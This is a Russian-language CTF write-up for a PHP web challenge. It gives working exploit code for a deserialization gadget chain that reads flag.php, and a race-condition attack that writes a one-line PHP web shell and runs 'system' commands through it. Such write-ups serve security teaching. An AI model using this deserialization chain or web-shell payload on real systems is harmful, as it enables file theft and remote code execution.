На видео: [2:53:38](https://vk.com/video-114366489_456239197?t=2h53m38s)

Два пути решения:

1) Собрать читалку файлов на unserialize:

```php
<?php

include './index.php';

$cart = new Cart('lolkek');
$item = new Item('flag.php',150);
$cart->addItem($item);
$user = new User("asdasdsad", "sadasdas", "adfsdafsd", "asdsada", $cart);
unserialize(serialize($user));

echo urlencode(serialize($user));
```

Как работает:
При десериализации объекта класса вызывается "магический" метод `__destruct`
1) При вызове `__destruct` юзера происходит удаление корзины (`$this->cart->delete()`)
2) При удалении корзины вызывается `$item->show()` для каждого айтема в корзине
3) `$item->show()` показывает содержимое файла, название которого в поле `info` (`echo file_get_contents($this->info)`)

Далее логика следующая, создаем объект `Cart`, создаем объект `Item` с `flag.php` (известно из исходников) в `info`, кладем айтем в корзину и создаем юзера с этой корзиной. Сериализуем объект и видим на страничке флаг.

Забавный факт: без просмотра html кода страницы в браузере флаг не покажется, т.к. <?php будет воспринят как валидный тег.

2) Race condition

При создании пользователя вызывается `file_put_contents()`, куда мы можем передать произвольный путь и произвольные данные. Путь корня web сервера можем узнать затриггерив ошибку с помощью невалидного пэйлоада на ансериалайз.

Схема эксплуатации:

<?php

include './index.php';
$user = new User("../public/race.php", "sadasdas", "<?=$_GET[a]($_GET[b]);?>", "asdsada", "asdasdasd");
echo urlencode(serialize($user));

Далее используем либо Burp Suite с интрудером в побольше потоков, либо пишем скрипт на удобном языке, который в несколько потоков дропает этот пейлоад в таск и дергает race.php?a=system&b=cat%20flag.php

Рано или поздно повезет, скрипт выиграет гонку и выведет флаг
